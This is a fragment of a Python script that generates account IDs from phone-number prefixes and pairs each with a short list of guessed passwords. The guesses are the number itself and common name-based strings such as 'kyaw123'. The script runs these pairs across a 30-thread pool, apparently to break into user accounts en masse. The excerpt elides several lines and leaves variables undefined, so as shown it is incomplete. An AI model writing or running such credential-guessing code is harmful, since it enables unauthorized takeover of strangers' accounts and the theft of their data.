...
def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 0945,0947,0940,0965,0967,0968,0976,0974,0975')
		...
		try:
			...
			limit = 5000
		clear()
		print('\033[1;32m [1] \033[1;31mMethod   (best) \033[1;31m \n [2] \033[1;31mMethod   (v-fast)  \033[1;31m \n [3] \033[1;31mMethod   (v-best)  \033[1;31m \n ')
		linex()
		mthd = input(' Choose: ')
		clear()
		...
		with tred(max_workers=30) as TRT:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'kyawkyaw','kyaw123','kyaw12345','kyawkyaw']
				if pcs in ['2','02']:
					passlist = [psx,ids,'kyawkyaw','kyaw123','kyaw12345','kyawkyaw']
				elif pcs in ['3','03']:
					passlist = [psx,ids,'kyawkyaw','kyaw123','kyaw12345','kyawkyaw']
